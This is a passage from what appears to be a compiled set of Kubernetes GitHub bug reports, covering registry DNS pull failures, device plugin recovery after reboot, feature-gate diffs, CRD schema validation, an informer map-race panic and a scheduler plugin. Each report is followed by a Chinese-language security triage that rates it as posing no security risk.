I am able to push to it using a simple kaniko job like such
```
apiVersion: batch/v1
kind: Job
metadata:
  labels:
    job-name: build-hello-world-0.0.0-test-3
  name: build-hello-world-0.0.0-test-3
  namespace: default
spec:
  template:
    metadata:
      labels:
        job-name: build-hello-world-0.0.0-test-3
    spec:
      containers:
      - args:
        - --context=tar:///mnt/build-contexts/1234567890/context.tar.gz
        - --dockerfile=Dockerfile
        - --destination=harbor.harbor.svc.cluster.local:80/hello-world:0.0.0
        - --verbosity=debug
        image: gcr.io/kaniko-project/executor:latest
        imagePullPolicy: IfNotPresent
        env:
          - name: DOCKER_CONFIG
            value: /kaniko/.docker
        name: kaniko
        volumeMounts:
        - mountPath: /mnt/build-contexts
          name: build-context-pvc
        - mountPath: /kaniko/.docker
          name: build-registry-secret
      restartPolicy: Never
      volumes:
      - name: build-context-pvc
        persistentVolumeClaim:
          claimName: build-context-pvc
      - name: build-registry-secret
        secret:
          defaultMode: 420
          secretName: build-registry-creds
```

However, when I try to make a dimple deployment based on this image that I've successfully pushed, I get this erroring event

```
│ Events:                                                                                                                                                                                                                                            │
│---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------│
│ Type      Reason     Age                   From               Message                                                                                                                                                                            │
│---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------│
│ Normal    Scheduled  13m                   default-scheduler  Successfully assigned default/hello-world-864ce95b-build-57f7d5f68f-lf6vd to minikube                                                                                              │
│ Warning   Failed     10m (x4 over 13m)     kubelet            Failed to pull image "harbor.harbor.svc.cluster.local:80/hello-world:0.0.0": Error response from daemon: Get "https://harbor.harbor.svc.cluster.local:80/v2/": dial tcp: lookup harbor.harbor.svc.cluster.local: │
│                                                             Temporary failure in name resolution                                                                                                                                                 │
```

Here is my deployment.yaml
```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello-world-build
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: hello-world-build
  template:
    metadata:
      labels:
        app: hello-world-build
    spec:
      containers:
      - env:
        - name: DOCKER_CONFIG
          value: /.docker
        image: harbor.harbor.svc.cluster.local:80/hello-world:0.0.0
        imagePullPolicy: IfNotPresent
        name: hello-world
        ports:
        - containerPort: 8000
          protocol: TCP
        volumeMounts:
        - mountPath: /.docker
          name: build-registry-secret
      volumes:
      - name: build-registry-secret
        secret:
          defaultMode: 420
          secretName: build-registry-creds
```

#### What did you expect to happen?

I expect the pull to work. At the very least if it's something to do with HTTP vs HTTPs I expect that to be the error message, not that TCP lookup fails, since my pushes are working using the kaniko job.

#### How can we reproduce it (as minimally and precisely as possible)?

See the description above. (I don't hink you need harbor, just any registry deployed using clusterIP

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
None, using minikube
</details>


#### OS version

<details>

```console
MacOS:
Darwin XXX.local 23.1.0 Darwin Kernel Version 23.1.0: Mon Oct  9 21:33:00 PDT 2023; root:xnu-10002.41.9~7/RELEASE_ARM64_T6031 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中使用Harbor私有仓库时，拉取镜像失败的问题。根据错误信息`dial tcp: lookup harbor.harbor.svc.cluster.local: Temporary failure in name resolution`，这是一个DNS解析失败的问题，可能是由于集群内部DNS配置不正确或暂时性故障引起的。此外，错误中提到`Get "https://harbor.harbor.svc.cluster.local:80/v2/"`，表明客户端尝试通过HTTPS协议在端口80上访问仓库，这可能是协议或端口配置不匹配导致的问题。总体来看，这属于配置错误或使用错误，并不涉及攻击者可利用的安全风险，也没有导致任何安全漏洞。

---

## Issue #128043 Pods that consume "devices" via Device Plugin always fail when Node reboots even if it implements `plugins_registry` interface

- Issue 链接：[#128043](https://github.com/kubernetes/kubernetes/issues/128043)

### Issue 内容

#### What happened?

When node reboots, Pods that consume **devices** via Device Plugin always fail.

Even if I implement device plugin with ability to use `/var/lib/kubelet/plugins_registry` directory, it fails too.

Below is my flow of inspection to understand current implementation of `kubelet` related to the device plugin interface.

***

I tested below cases:
- Only `kubelet` restarts
- Only `containerd` restarts
- Both `kubelet` and `containerd` restart

All of 3 cases do not make any error. It only happens when node reboots.

***

Device Health status is provided using `healthDevices`.
- [When `kubelet` starts, it restores from checkpoint, but both `healthDevices` and `unhealthyDevices` set to empty set.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L506-L532)
- [`healthyDevices` will be supplied through this code block.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L259-L318)
    - Right now, there is no other code block that supplies `healthyDevices`.

About Device Plugin Registration
- [Device Plugin can be registered to `kubelet` through this code block.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/handler.go#L41-L44)
    - Plugin sends request to `kubelet`.
- After registration, dedicated client will be created and [run at another goroutine](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/handler.go#L78-L80).
- [As I mentioned above, `healthyDevices` can only be injected through this code block](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L271-L318).
    - However, initialization always happens at the beginning of this code block.
- To summarize it, **there is no way to supply health devices before device plugin registration**.

***

About `PluginManager` and `plugins_registry`
> `pluginmanager` runs a set of asynchronous loops that figure out which plugins need to be registered/unregistered based on this node and makes it so.
- [`plugins_registry` is used at `PluginManager`. The first usage can be found here](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/kubelet.go#L848-L851).
- [In `PluginManager`, registration of Device Plugin watcher (NOT the DEVICE PLUGIN) happens.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/kubelet.go#L1581-L1582)
    - [For device plugin, this code block implements Device Plugin watcher interface.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/server.go#L40-L45)
- [After registration of watcher, `PluginManager` runs.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/plugin_manager.go#L108-L124)
    - Inside that code block, we can find `go pm.reconciler.Run(stopCh)`. We can jump to [this section](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/reconciler/reconciler.go#L85-L91).
- [In the `reconcile()`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/reconciler/reconciler.go#L111-L165), it syncs `desiredStateOfWorld` and `actualStateOfWorld`.
- [In this code block, all unix sockets exist in the `/var/lib/kubelet/plugins_registry` are managed through `AddOrUpdatePlugin()` method.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/pluginwatcher/plugin_watcher.go#L187-L200)

All of above steps are executed BEFORE entering `syncLoop()`.

***

So my thought was, If I implement device plugin to deal with `plugins_registry`, it can be registered to `kubelet` before other pod run.
- [`GetInfo(...)`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/operationexecutor/operation_generator.go#L91) and [`NotifyRegistrationStatus(...)`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/operationexecutor/operation_generator.go#L166) GRPC interface have to be implemented.

However, even if I implemented above things, same problem happens.
- When node reboots, all containers are in stopped state.
- `kubelet` is in charge of re-run stopped containers in that node.
- Before entering `syncLoop()`, 2 GRPC interface will be called.
    - However, because device plugin pod is in stopped state, above GRPC call fails.
    - Due to failure of above GRPC call, device plugin registration before entering `syncLoop()` also fails too.

To solve this problem, I have to run the device plugin using other method (e.g. systemd daemon), that can't be managed by kubelet.

#### What did you expect to happen?

To be honest, I know the current problem but don't know the nice solution.

#### How can we reproduce it (as minimally and precisely as possible)?

Prepare device plugin (e.g. [`NVIDIA/k8s-device-plugin`](https://github.com/NVIDIA/k8s-device-plugin)) and run any Pod consumes that device (e.g. NVIDIA GPU).

After Pod successfully created and run without any problem, DO node reboot (e.g. just type `sudo reboot`).

After node reboots, you can see error message like below.
```
Allocate failed due to no healthy devices present; cannot allocate unhealthy devices nvidia.com/gpu, which is unexpected
```

#### Anything else we need to know?

This issue has been discussed in [this Slack thread](https://kubernetes.slack.com/archives/C0BP8PW9G/p1709610711920639).


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5
```

</details>


#### Cloud provider

<details>
Bare Metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux MS03-CEO-008 6.8.0-45-generic #45~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep 11 15:25:05 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
kubeadm version: &version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.5", GitCommit:"74e84a90c725047b1328ff3d589fedb1cb7a120e", GitTreeState:"clean", BuildDate:"2024-09-12T00:17:07Z", GoVersion:"go1.22.6", Compiler:"gc", Platform:"linux/amd64"}
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.7.22 7f7fdf5fed64eb6a7caf99b3e12efcf9d60e311c
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
这份Issue描述了在Kubernetes中，当节点重启时，使用Device Plugin消费设备的Pod会失败的问题。即使实现了`plugins_registry`接口，问题依然存在。

通过分析，原因在于：

- 节点重启后，Device Plugin Pod处于停止状态，kubelet在进入`syncLoop()`之前无法成功注册Device Plugin。
- 由于Device Plugin未注册，`healthyDevices`无法被正确加载，导致Pod无法分配到设备。
- 解决方法是将Device Plugin以kubelet管理之外的方式运行，例如利用systemd守护进程。

根据以上分析，这个Issue属于功能性问题，是Device Plugin在节点重启后的恢复机制不完善导致的，并未涉及到安全风险。

根据风险判断标准：

1. **该风险能被攻击者利用**：此问题属于kubelet与Device Plugin之间的交互问题，无法被攻击者利用。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：不符合。
3. **Issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险**。
4. **风险评级为“不涉及”**。

因此，判定此Issue不涉及安全风险。

---

## Issue #128036 Kubernetes Compatibility Versions: Feature Gate Discrepency when comparing HEAD w/ --emulated-version=1.31 w/ branch:`v1.31.1` branch (K8s release v1.31.1)

- Issue 链接：[#128036](https://github.com/kubernetes/kubernetes/issues/128036)

### Issue 内容

#### What happened?

I am seeing a discrepancy in values comparing the feature gates of  HEAD w/ --emulated-version=1.31 (HEAD as of 10/12/2024) w/ branch:`v1.31.1` branch:

The feature gate values below were captured by running the hack/local-up-cluster.sh script and hitting the /metrics endpoint.

- HEAD w/ --emulated-version=1.31: 
```bash
$ EMULATED_VERSION=1.31 sudo -E hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```
  - https://gist.github.com/aaron-prindle/3124f38817db18381336dc0fe0fcd879
- 1.31.1 release:
```bash
sudo hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```
  - https://gist.github.com/aaron-prindle/90f54bb25e90d7bff8a8a25c727b22fe

Diff of the feature gates:
```diff
aprindle@aprindle-ssd ~/ft-gate-diffs/actual diff -u 1.31.1-release.txt HEAD-w-1.31-emulation-10-12-2024.txt 
--- 1.31.1-release.txt	2024-10-13 03:48:20.047411576 +0000
+++ HEAD-w-1.31-emulation-10-12-2024.txt	2024-10-13 22:35:59.973302704 +0000
@@ -11,7 +11,6 @@
 kubernetes_feature_enabled{name="AllBeta",stage="BETA"} 0
 kubernetes_feature_enabled{name="AllowDNSOnlyNodeCSR",stage="DEPRECATED"} 0
 kubernetes_feature_enabled{name="AllowInsecureKubeletCertificateSigningRequests",stage="DEPRECATED"} 0
-kubernetes_feature_enabled{name="AllowServiceLBStatusOnNonLB",stage="DEPRECATED"} 0
 kubernetes_feature_enabled{name="AnonymousAuthConfigurableEndpoints",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="AnyVolumeDataSource",stage="BETA"} 1
 kubernetes_feature_enabled{name="AppArmor",stage=""} 1
@@ -26,10 +25,8 @@
 kubernetes_feature_enabled{name="CSIMigrationPortworx",stage="BETA"} 1
 kubernetes_feature_enabled{name="CSIVolumeHealth",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="CloudControllerManagerWebhook",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="CloudDualStackNodeIPs",stage=""} 1
 kubernetes_feature_enabled{name="ClusterTrustBundle",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="ClusterTrustBundleProjection",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="ComponentSLIs",stage="BETA"} 1
 kubernetes_feature_enabled{name="ConcurrentWatchObjectDecode",stage="BETA"} 0
 kubernetes_feature_enabled{name="ConsistentListFromCache",stage="BETA"} 1
 kubernetes_feature_enabled{name="ContainerCheckpoint",stage="BETA"} 1
@@ -66,8 +63,6 @@
 kubernetes_feature_enabled{name="JobPodReplacementPolicy",stage="BETA"} 1
 kubernetes_feature_enabled{name="JobSuccessPolicy",stage="BETA"} 1
 kubernetes_feature_enabled{name="KMSv1",stage="DEPRECATED"} 0
-kubernetes_feature_enabled{name="KMSv2",stage=""} 1
-kubernetes_feature_enabled{name="KMSv2KDF",stage=""} 1
 kubernetes_feature_enabled{name="KubeProxyDrainingTerminatingNodes",stage=""} 1
 kubernetes_feature_enabled{name="KubeletCgroupDriverFromCRI",stage="BETA"} 1
 kubernetes_feature_enabled{name="KubeletInUserNamespace",stage="ALPHA"} 0
@@ -75,7 +70,6 @@
 kubernetes_feature_enabled{name="KubeletPodResourcesGet",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="KubeletSeparateDiskGC",stage="BETA"} 1
 kubernetes_feature_enabled{name="KubeletTracing",stage="BETA"} 1
-kubernetes_feature_enabled{name="LegacyServiceAccountTokenCleanUp",stage=""} 1
 kubernetes_feature_enabled{name="LoadBalancerIPMode",stage="BETA"} 1
 kubernetes_feature_enabled{name="LocalStorageCapacityIsolationFSQuotaMonitoring",stage="BETA"} 0
 kubernetes_feature_enabled{name="LogarithmicScaleDown",stage=""} 1
@@ -86,14 +80,11 @@
 kubernetes_feature_enabled{name="MaxUnavailableStatefulSet",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="MemoryManager",stage="BETA"} 1
 kubernetes_feature_enabled{name="MemoryQoS",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="MinDomainsInPodTopologySpread",stage=""} 1
 kubernetes_feature_enabled{name="MultiCIDRServiceAllocator",stage="BETA"} 0
 kubernetes_feature_enabled{name="MutatingAdmissionPolicy",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="NFTablesProxyMode",stage="BETA"} 1
-kubernetes_feature_enabled{name="NewVolumeManagerReconstruction",stage=""} 1
 kubernetes_feature_enabled{name="NodeInclusionPolicyInPodTopologySpread",stage="BETA"} 1
 kubernetes_feature_enabled{name="NodeLogQuery",stage="BETA"} 0
-kubernetes_feature_enabled{name="NodeOutOfServiceVolumeDetach",stage=""} 1
 kubernetes_feature_enabled{name="NodeSwap",stage="BETA"} 1
 kubernetes_feature_enabled{name="OpenAPIEnums",stage="BETA"} 1
 kubernetes_feature_enabled{name="PDBUnhealthyPodEvictionPolicy",stage=""} 1
@@ -124,8 +115,6 @@
 kubernetes_feature_enabled{name="SchedulerQueueingHints",stage="BETA"} 0
 kubernetes_feature_enabled{name="SeparateCacheWatchRPC",stage="BETA"} 1
 kubernetes_feature_enabled{name="SeparateTaintEvictionController",stage="BETA"} 1
-kubernetes_feature_enabled{name="ServerSideApply",stage=""} 1
-kubernetes_feature_enabled{name="ServerSideFieldValidation",stage=""} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenJTI",stage="BETA"} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenNodeBinding",stage="BETA"} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenNodeBindingValidation",stage="BETA"} 1
@@ -133,7 +122,6 @@
 kubernetes_feature_enabled{name="ServiceTrafficDistribution",stage="BETA"} 1
 kubernetes_feature_enabled{name="SidecarContainers",stage="BETA"} 1
 kubernetes_feature_enabled{name="SizeMemoryBackedVolumes",stage="BETA"} 1
-kubernetes_feature_enabled{name="StableLoadBalancerNodeSet",stage=""} 1
 kubernetes_feature_enabled{name="StatefulSetAutoDeletePVC",stage="BETA"} 1
 kubernetes_feature_enabled{name="StatefulSetStartOrdinal",stage=""} 1
 kubernetes_feature_enabled{name="StorageNamespaceIndex",stage="BETA"} 1
@@ -154,7 +142,6 @@
 kubernetes_feature_enabled{name="UnknownVersionInteroperabilityProxy",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="UserNamespacesPodSecurityStandards",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="UserNamespacesSupport",stage="BETA"} 0
-kubernetes_feature_enabled{name="ValidatingAdmissionPolicy",stage=""} 1
 kubernetes_feature_enabled{name="VolumeAttributesClass",stage="BETA"} 0
 kubernetes_feature_enabled{name="VolumeCapacityPriority",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="WatchBookmark",stage=""} 1
```


The check here was done as part of https://github.com/kubernetes/kubernetes/issues/127947 as I was seeing some discrepencies in the feature gates when writing an integration test and wanted to understand a bit more if this is expected and what deltas are expected/allowed.  

#### What did you expect to happen?

I expected the feature gates to be identical

#### How can we reproduce it (as minimally and precisely as possible)?

Get the feature gate values for `HEAD` and `v1.31.1` by running the hack/local-up-cluster.sh script and hitting the /metrics endpoint for both.  Then compare the `kubernetes_feature_enabled` values:


`HEAD` w/ --emulated-version=1.31
```bash
$ EMULATED_VERSION=1.31 sudo -E hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```

`v1.31.1`
```bash
$ sudo hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在使用`--emulated-version=1.31`运行HEAD时，得到的feature gate状态与v1.31.1分支运行时的feature gate状态存在差异。报告者通过比较`/metrics`端点中的`kubernetes_feature_enabled`指标，发现了一些feature gates在两种情况下的启用状态不一致。

从提供的diff中，可以看到在HEAD版本中，一些feature gates不存在或状态不同。这可能是由于HEAD版本的代码变动导致的，在使用`--emulated-version`时没有正确地模拟所有feature gate。

然而，从安全角度来看，Issue中并未提及任何涉及高风险安全问题的内容，也没有提到任何特定的feature gate差异可能导致的安全漏洞。Issue主要关注在不同版本之间feature gate启用状态的不一致性，没有发现有可被攻击者利用的安全风险。

因此，根据提供的信息，认为该Issue不涉及安全风险。

---

## Issue #128033 In a CRD's schema, invalid schemas for array elements are accepted

- Issue 链接：[#128033](https://github.com/kubernetes/kubernetes/issues/128033)

### Issue 内容

#### What happened?

I accidentally wrote an invalid OpenAPI v3.0 schema for the elements of an array in a CRD's schema. `kubectl create --validate=strict` accepted my CRD definition without complaint, and silently discarded my invalid schema property. I have attached two files that demonstrate the problem. test1.yaml.txt gets rejected, while test2.yaml.txt is accepted but the `{propertyNames: {pattern: foo}}` gets silently transformed to `{}`.

[test2.yaml.txt](https://github.com/user-attachments/files/17356492/test2.yaml.txt)

[test1.yaml.txt](https://github.com/user-attachments/files/17356493/test1.yaml.txt)



#### What did you expect to happen?

I expected my schema to be implemented or rejected.

#### How can we reproduce it (as minimally and precisely as possible)?

Shown above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.2
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

MacOS 15.0.1
container runtime is docker in Rancher Desktop.
Inside the VM guest, `/etc/os-release` says:

```
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.20.3
PRETTY_NAME="Alpine Linux v3.20"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
BUILD_ID="v0.2.39.rd4"
VARIANT_ID="rd"
```

</details>


#### Install tools

<details>
kind v0.22.0
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
docker in Rancher Desktop; client v27.2.1-rd; server engine 26.1.5, containerd v1.7.17, runc 1.1.14, docker-init 0.19.0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在CRD的schema中，数组元素的无效schema被接受，`kubectl create --validate=strict` 未给出警告或错误，而是默默地丢弃了无效的schema属性。根据提供的信息，这可能导致用户的CRD定义未按照预期工作，但这属于功能性问题，而非安全风险。根据风险判断标准第6条，此Issue不涉及安全问题。

---

## Issue #128017 with transform and resync, you may get concurrent map read/iteration or concurrent write panic easily

- Issue 链接：[#128017](https://github.com/kubernetes/kubernetes/issues/128017)

### Issue 内容

#### What happened?

If you are setting none zero resync time and transform func to write annotations or labels, you may get `fatal error: concurrent map iteration and map write` panic easily. 


#### What did you expect to happen?

This kind of bug is hard to find. I wonder if there is something can be done in client-go to prevent developers from falling into the trap.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the following code a while, it panics with `fatal error: concurrent map iteration and map write`

```
package main

import (
	"flag"
	"fmt"
	"time"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/client-go/informers"
	"k8s.io/client-go/kubernetes/fake"
	"k8s.io/client-go/tools/cache"
	"k8s.io/klog/v2"
)

func main() {
	klog.InitFlags(nil)
	flag.Parse()
	defer klog.Flush()
	pod := &corev1.Pod{
		TypeMeta:   metav1.TypeMeta{Kind: "Pod", APIVersion: "v1"},
		ObjectMeta: metav1.ObjectMeta{Name: "foo", Namespace: "default", Annotations: map[string]string{"a": "b"}}}
	client := fake.NewSimpleClientset(pod)
	factory := informers.NewSharedInformerFactoryWithOptions(client, time.Millisecond*100,
		informers.WithTransform(func(obj interface{}) (interface{}, error) {
			if accessor, err := meta.Accessor(obj); err == nil {
				klog.Infof("transform pod %s", accessor.GetName())
				if accessor.GetAnnotations() != nil {
					delete(accessor.GetAnnotations(), "a1")
				}
			}
			return obj, nil
		}))
	if _, err := factory.Core().V1().Pods().Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{
		AddFunc: func(obj interface{}) {
			pod, ok := obj.(*corev1.Pod)
			if !ok {
				return
			}
			klog.Infof("add pod %s", pod.Name)
		},
		UpdateFunc: func(oldObj, newObj interface{}) {
			newPod := newObj.(*corev1.Pod)
			// We use periodic resync to do consistency check so do not check the equity of ResourceVersion here.
			klog.Infof("update pod %s", newPod.Name)
		},
		DeleteFunc: func(obj interface{}) {
			pod, ok := obj.(*corev1.Pod)
			// When a delete is dropped, the relist will notice a pod in the store not
			// in the list, leading to the insertion of a tombstone object which contains
			// the deleted key/value. Note that this value might be stale.
			if !ok {
				tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
				if !ok {
					runtime.HandleError(fmt.Errorf("couldn't get object from tombstone %+v", obj))
					return
				}
				pod, ok = tombstone.Obj.(*corev1.Pod)
				if !ok {
					runtime.HandleError(fmt.Errorf("tombstone contained object that is not a pod %+v", obj))
					return
				}
			}
			klog.Infof("delete pod %s", pod.Name)
		},
	}); err != nil {
		klog.Fatal(err)
	}
	go func() {
		for {
			pods, err := factory.Core().V1().Pods().Lister().Pods(metav1.NamespaceAll).List(labels.Everything())
			if err != nil {
				klog.Fatal(err)
			}
			for _, pod := range pods {
				for k, v := range pod.Annotations {
					klog.V(3).Infof("pod k, v: %s=%s", k, v)
				}
			}
		}
	}()
	stopCh := make(chan struct{})
	factory.Start(stopCh)
	klog.Infof("waiting for caches to sync")
	for {
		if factory.Core().V1().Pods().Informer().HasSynced() {
			klog.Infof("pod synced")
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	<-stopCh
}
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

client-go v0.29.7


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，发现当设置非零的resync时间和transform函数来修改annotations或labels时，可能会导致并发的map读写，从而引发程序的panic。

这个问题主要是由于开发者在使用client-go库时不当操作导致的并发访问错误，并不是项目本身的安全漏洞。

根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为“不涉及”。

---

## Issue #128002 Unable to simulate the unschedulable state through plugin

- Issue 链接：[#128002](https://github.com/kubernetes/kubernetes/issues/128002)

### Issue 内容

#### What happened?

I want to simulate the the Unschedulable state (intentationally) using plugin but unable to do

```golang
func (pl *CustomePlugin) Bind(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) *framework.Status {
	log.Printf("Simulating failure in binding for pod %s to node %s", pod.Name, nodeName)
	return framework.NewStatus(framework.Unschedulable, "Pod will remain in Pending state, no node bound")
}
```

Here is my Config
```
    plugins:
      bind:
        enabled:
          - name: CustomPlugin
        disabled:
          - name: "*"
      score:
        # Additional enabled plugins
        enabled:
          - name: CustomPlugin
        disabled:
          - name: "*"
```

When i am describing pod log, It schedule on another node here is the log

<img width="1062" alt="Screenshot 2024-10-11 at 7 32 38 PM" src="https://github.com/user-attachments/assets/f1e9f579-20d7-4fa0-a599-e43e64a34459">

What I am doing wrong?


#### What did you expect to happen?

It should not schedule to any node.

#### How can we reproduce it (as minimally and precisely as possible)?

Here is my `main.go`

```golang
package main

import (
	"context"
	"fmt"
	"log"

	v1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/kubernetes/cmd/kube-scheduler/app"
	"k8s.io/kubernetes/pkg/scheduler/framework"
)

const (
	PluginName = "CustomScheduler"
)

type CustomScheduler struct {
	handle framework.Handle
}

var _ framework.ScorePlugin = &CustomScheduler{}

func (pl *CustomScheduler) Name() string {
	return PluginName
}

func (pl *CustomScheduler) Score(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) (int64, *framework.Status) {
	if nodeName == "w1" || nodeName == "w2" {
		return 100, nil
	}

	return 0, nil
}

func (pl *CustomScheduler) ScoreExtensions() framework.ScoreExtensions {
	return pl
}

func (pl *CustomScheduler) Bind(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) *framework.Status {
	// Log the attempt to bind the pod and simulate failure
	log.Printf("Simulating failure in binding for pod %s to node %s", pod.Name, nodeName)

	// Return an error to keep the pod in Pending state
	return framework.NewStatus(framework.Unschedulable, "Pod will remain in Pending state, no node bound")
}

func (pl *CustomScheduler) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *v1.Pod, scores framework.NodeScoreList) *framework.Status {
	fmt.Println(scores)
	return nil
}

func New(_ context.Context, _ runtime.Object, h framework.Handle) (framework.Plugin, error) {
	return &CustomScheduler{handle: h}, nil
}

func main() {
	cmd := app.NewSchedulerCommand(
		app.WithPlugin(PluginName, New),
	)

	err := cmd.Execute()
	if err != nil {
		log.Fatal(err)
	}
}
```

config.yaml
```
apiVersion: kubescheduler.config.k8s.io/v1
kind: KubeSchedulerConfiguration
clientConnection:
  kubeconfig: "/Users/bhautik/.kube/config"
profiles:
  - schedulerName: default-scheduler
    percentageOfNodesToScore: 100
    plugins:
      bind:
        enabled:
          - name: CustomScheduler
            weight: 5
        disabled:
          - name: "*"
      score:
